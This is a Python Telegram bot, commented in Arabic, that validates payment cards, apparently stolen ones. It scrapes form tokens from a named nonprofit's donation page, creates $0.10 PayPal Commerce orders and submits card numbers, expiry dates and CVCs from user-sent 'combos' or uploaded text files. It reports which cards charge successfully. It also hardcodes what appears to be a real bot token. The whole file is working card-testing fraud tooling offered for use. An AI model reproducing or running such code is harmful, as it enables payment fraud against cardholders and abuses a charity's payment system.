import telebot
import requests
import base64
import re
import time
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import os
import logging

# إعداد السجلات لمراقبة أداء البوت وتحديد المشاكل
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# استخدام متغير بيئة للتوكن لزيادة الأمان عند الرفع على GitHub
TOKEN = os.getenv('BOT_TOKEN', '8709460165:AAFnoYKpwLGINPx7002oAXnHk0dEPUqyFuI')
bot = telebot.TeleBot(TOKEN)

def kefara(ccx):
    try:
        logging.info(f"Starting check for: {ccx}")
        r = requests.Session()
        user = generate_user_agent()
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "❌ Invalid Format"
        
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy and len(yy) == 4: yy = yy.split("20")[1]
            
        headers = {'user-agent': user}
        
        # المرحلة 1: جلب التوكنات (تقليل المهلة لسرعة الاستجابة)
        logging.info("Step 1: Fetching tokens...")
        try:
            response = r.get('https://www.northidahowaterpolo.org/donations/donation-form/', headers=headers, timeout=10)
        except Exception as e:
            logging.error(f"Step 1 failed: {e}")
            return "❌ Site Down/Slow"

        try:
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        except Exception as e:
            logging.error(f"Failed to extract tokens: {e}")
            return "❌ Gateway Dead (Tokens)"

        headers = {
            'origin': 'https://www.northidahowaterpolo.org',
            'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # المرحلة 2: إنشاء طلب PayPal مباشرة (دمج المراحل لسرعة التنفيذ)
        logging.info("Step 2: Creating PayPal order...")
        multipart_data = MultipartEncoder({
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-hash': (None, nonec),
            'give-amount': (None, '0.10'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'KEFARA'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'kefara22@gmail.com'),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers['content-type'] = multipart_data.content_type
        try:
            response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, headers=headers, data=multipart_data, timeout=10)
            tok = response.json()['data']['id']
        except Exception as e:
            logging.error(f"Step 2 failed: {e}")
            return "❌ Gateway Error (Order)"
        
        # المرحلة 3: تأكيد وسيلة الدفع مع PayPal
        logging.info("Step 3: Confirming payment source...")
        headers_paypal = {
            'authorization': f'Bearer {au}',
            'content-type': 'application/json',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        try:
            response = r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data, timeout=10)
            # التحقق الفوري من رد PayPal المباشر
            if response.status_code != 200:
                err_json = response.json()
                issue = err_json.get('details', [{}])[0].get('issue', 'DECLINED')
                if issue == 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING': return "❌ Payee Disabled"
                return f"❌ {issue}"
        except Exception as e:
            logging.error(f"Step 3 failed: {e}")
            return "❌ PayPal Timeout"
        
        # المرحلة 4: الموافقة النهائية
        logging.info("Step 4: Final approval...")
        params_approve = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
        try:
            response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params=params_approve, headers=headers, data=multipart_data, timeout=10)
            text = response.text
            if 'true' in text or 'sucsess' in text: return "✅ Charge !"
            elif 'INSUFFICIENT_FUNDS' in text: return '❌ Insufficient Funds'
            else: return "❌ Declined"
        except Exception as e:
            logging.error(f"Step 4 failed: {e}")
            return "❌ Final Approval Error"
                
    except Exception as e:
        logging.error(f"General error in kefara: {e}")
        return "⚠️ Connection Error"

def format_result(combo, result):
    status_icon = "💳"
    if "Charge" in result: status_icon = "🔥"
    elif "Insufficient Funds" in result: status_icon = "💰"
    elif "Payee Disabled" in result: status_icon = "💀"
    
    msg = f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"✨ **Card Check Result** ✨\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📍 **Card:** `{combo}`\n"
    msg += f"💠 **Status:** {result} {status_icon}\n"
    msg += f"🌐 **Gateway:** PayPal Commerce\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"👤 **Checked By:** @{bot.get_me().username}\n"
    return msg

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 **أهلاً بك!**\n\nأرسل `/pp [combo]` للفحص.", parse_mode='Markdown')

@bot.message_handler(commands=['pp'])
def check_pp(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ **أرسل الكومبو بعد الأمر!**", parse_mode='Markdown')
            return
        
        combo = args[1]
        # إرسال رد فوري وعدم تعديل الرسالة لتجنب التعليق
        result = kefara(combo)
        bot.reply_to(message, format_result(combo, result), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in /pp command: {e}")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        if message.document.file_name.endswith('.txt'):
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open("temp_combo.txt", 'wb') as f: f.write(downloaded_file)
            
            bot.reply_to(message, "📥 **تم استلام الملف، جاري الفحص...**", parse_mode='Markdown')
            with open("temp_combo.txt", 'r') as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
            
            results = []
            # فحص أول 10 بطاقات فقط للتأكد من الاستقرار
            for line in lines[:10]:
                res = kefara(line)
                results.append(f"🔹 `{line}` -> {res}")
            
            bot.reply_to(message, "📊 **النتائج:**\n\n" + "\n".join(results), parse_mode='Markdown')
            if os.path.exists("temp_combo.txt"): os.remove("temp_combo.txt")
        else:
            bot.reply_to(message, "⚠️ **ارفع ملف .txt فقط!**", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in document handler: {e}")

if __name__ == "__main__":
    logging.info("Bot started...")
    bot.infinity_polling()
